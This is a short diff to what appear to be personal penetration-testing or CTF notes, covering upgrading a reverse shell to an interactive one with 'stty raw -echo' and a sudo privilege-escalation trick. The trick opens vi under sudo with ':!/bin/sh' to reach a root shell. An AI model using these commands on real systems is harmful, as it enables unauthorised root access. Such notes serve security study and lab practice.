@@ -1,2 +1,7 @@
 make interactive (reverce shell)==>
                 stty raw -echo
+                
+priv Esc ==>    if by terminal, vi is in sudo -l then
+
+$vi /route/file.php -c ':!/bin/sh'
+                       <--ESCAPE AND GET ROOT T-->
